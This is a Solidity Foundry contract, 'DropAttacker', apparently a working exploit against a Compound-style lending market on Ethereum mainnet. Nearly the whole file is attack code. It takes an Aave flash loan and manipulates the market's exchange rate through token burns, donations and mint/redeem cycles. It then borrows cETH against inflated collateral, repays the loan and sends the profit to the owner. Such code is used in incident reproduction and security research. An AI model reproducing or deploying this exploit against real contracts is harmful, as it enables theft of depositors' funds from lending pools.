// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./IPoolV2.sol";
import "./IFlashLoanReceiver.sol";
import "./IERC20.sol";
import "./IUniswapV2Router.sol";
import "./IUnitroller.sol";
import "./ICerc20.sol";
import "./Swap.sol";
import "./Executor.sol";

interface INFTI is IERC20 {
    function mint(uint256 amount) external;
    function burn(uint256 amount) external;
}

contract DropAttacker is IFlashLoanReceiver, Swap, Executor, Test {

    // Addresses
    // address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; //Main
    // address public WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;//Main 
    // address public USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //Main
    address public NFTI = 0x525eF76138Bf76118d786DbedeaE5F87aaBf4a81;

    // address public MEEB = 0x641927E970222B10b2E8CDBC96b1B4F427316f16;
    address public xMEEB = 0x11Df658567e615f69D23289BE8A27a9C260cE297;
    address public xPUNK = 0x08765C76C758Da951DC73D3a8863B34752Dd76FB;
    address public kERC20_1 = 0x8486B523a32e9D0d021078Fe68a3b98fC765FbaB;//Main xMeeb
    address public kERC20_2 = 0xfBA58fDDB88203E1D32D0F3E6DbFD9d8b505EC18;//Main xPunk
    // address public kERC20_3 = 0x0Fc825B3c2333eAAf277cED5CA239EDa82913be5;//Main uni
    address public UNITROLLER = 0xB70FB69a522ed8D4613C4C720F91F93a836EE2f5;//Main

    address public AAVE_POOLV2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;//Main  
    ILendingPool flashPool = ILendingPool(AAVE_POOLV2);// AAVE pool V2 
    CErc20Interface victim2 = CErc20Interface(kERC20_2);
    CErc20Interface victim1 = CErc20Interface(kERC20_1);

    // IERC20 dai = IERC20(DAI);
    IERC20 xpunk = IERC20(xPUNK);
    // IERC20 meeb = IERC20(MEEB);
    IERC20 xmeeb = IERC20(xMEEB);

    ComptrollerInterface unitroller = ComptrollerInterface(UNITROLLER);
    INFTI nfti = INFTI(NFTI);

    
    constructor() Executor(msg.sender) payable{
        
    }

    function getFlashloan(uint256 weth_amount) external onlyExecutor returns (bool) {
      
        weth.approve(AAVE_POOLV2, uint256(2**256-1));

        address[] memory assets = new address[](1);
        assets[0] = WETH;
        // assets[1] = WBTC;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = weth_amount;
        // amounts[1] = dai_amount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        // modes[1] = 0;

        // bytes memory data = abi.encode(wbtc_amount, dai_amount, exchangeRateUpdated);

        flashPool.flashLoan(address(this), assets, amounts, modes, address(this), hex"", uint16(0));

        uint256 ethAmount = payable(address(this)).balance;
        payable(owner).transfer(ethAmount);

        return true;
    }


    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,// 5%..
        address initiator,
        bytes calldata params
    ) external override returns (bool) {   
        assets;
        require(initiator == address(this), "Not waste your time ;)");        
        // deal(WETH, address(this), 100e18);//Test
        weth.approve(_swapRouter, 100e18);
        uniswapRouterSwap(WETH, NFTI, 100e18, 0, 3000);
        uint256 balbNfti = balanceOfThis(NFTI);
        nfti.burn(balbNfti);    

        transferToDrop();  
        transferToDrop();  

        {
        // nfti.approve(NFTI, uint256(2**256-1));
        xpunk.approve(NFTI, balanceOfThis(xPUNK));
        xmeeb.approve(NFTI, balanceOfThis(xMEEB));
        IERC20(0xb31858B8a49DD6099869B034DA14a7a9CAd1382b).approve(NFTI, balanceOfThis(0xb31858B8a49DD6099869B034DA14a7a9CAd1382b));//xCOOL
        IERC20(0xABbDBB92cd58fd2f7DbA953855B88ED2a2BE1465).approve(NFTI, balanceOfThis(0xABbDBB92cd58fd2f7DbA953855B88ED2a2BE1465));//xWOW
        IERC20(0x929Fd5879847F41f05B6Cf3746b4343f38b8741B).approve(NFTI, balanceOfThis(0x929Fd5879847F41f05B6Cf3746b4343f38b8741B));//xSQGL
        IERC20(0x804bc39d5670ca176203556DAc06FCD7ED37DdB1).approve(NFTI, balanceOfThis(0x804bc39d5670ca176203556DAc06FCD7ED37DdB1));//xTOADZ
        IERC20(0xCb784233855C97d8532F8eeFA094bA876187A150).approve(NFTI, balanceOfThis(0xCb784233855C97d8532F8eeFA094bA876187A150));//xNoodle
        nfti.mint(balbNfti-10e15);
        }

        uint256 balaNfti = balanceOfThis(NFTI);
        nfti.approve(_swapRouter, balaNfti);
        uniswapRouterSwap(NFTI, WETH, balaNfti, 0, 3000);
        // console.log("WETH balance :",);
        // weth.withdraw(balanceOfThis(WETH));
        uint256 amountOwned = amounts[0] + premiums[0] - balanceOfThis(WETH);
        weth.deposit{value:amountOwned}();
        //
        // console.log("Final ETH balance :",ethAmount-ethAmount0-100e18);
        return true;
    }

    function transferToDrop() internal {

        address[] memory cTokens = new address[](2);
        cTokens[0] = kERC20_1;  
        cTokens[1] = kERC20_2;
        uint[] memory errors = unitroller.enterMarkets(cTokens);

        uint256 xmAmount = balanceOfThis(xMEEB);
        uint256 xpAmount = balanceOfThis(xPUNK);

        xmeeb.approve(kERC20_1, xmAmount);    
        xpunk.approve(kERC20_2, xpAmount);
        victim1.mint(xmAmount);
        // victim2.mint(xpAmount);

        {        
            // console.log(errors[0]);            
            victim1.redeem(victim1.balanceOf(address(this))-2);
            // victim2.redeem(victim2.balanceOf(address(this))-2);
       
            uint256 transferAmountXm = balanceOfThis(xMEEB);
            uint256 transferAmountXp = balanceOfThis(xPUNK);
            xmeeb.transfer(kERC20_1, transferAmountXm);
            // xpunk.transfer(kERC20_2, transferAmountXp);
            
            // console.log(victim1.exchangeRateStored());       
            (uint a, uint b, uint c) = unitroller.getAccountLiquidity(address(this));
            console.log("a :",a);
            console.log("b :",b);
            console.log("c :",c);
         
            // CErc20Interface(0xD72929e284E8bc2f7458A6302bE961B91bccB339).borrow(80*10**17);//cETH
            CErc20Interface(0xD72929e284E8bc2f7458A6302bE961B91bccB339).borrow(23*10**17);//cETH
            console.log("Before :",victim1.balanceOf(address(this)));

            victim1.redeemUnderlying(transferAmountXm);
            // victim2.redeemUnderlying(transferAmountXp);

            //Test
            console.log("xMEEB after balance :",balanceOfThis(xMEEB));
            console.log("xPUNK after balance :",balanceOfThis(xPUNK));
            console.log("After :",victim1.balanceOf(address(this)));
            
        }
    }

    function balanceOfThis(address _erc20TokenAddress) internal view returns (uint256 bal) {
        IERC20 ERC20Token;    
        ERC20Token = IERC20(_erc20TokenAddress);
   
        bal = ERC20Token.balanceOf(address(this));
        console.log("Executor Token balance", bal);
        return bal;   

    }

    function call (address payable _to, uint256 _value, bytes calldata _data) external onlyOwner payable returns (bytes memory) {
        require(_to != address(0));
        (bool _success, bytes memory _result) = _to.call{value: _value}(_data);
        require(_success);
        return _result;
    }

    receive()external payable {}

}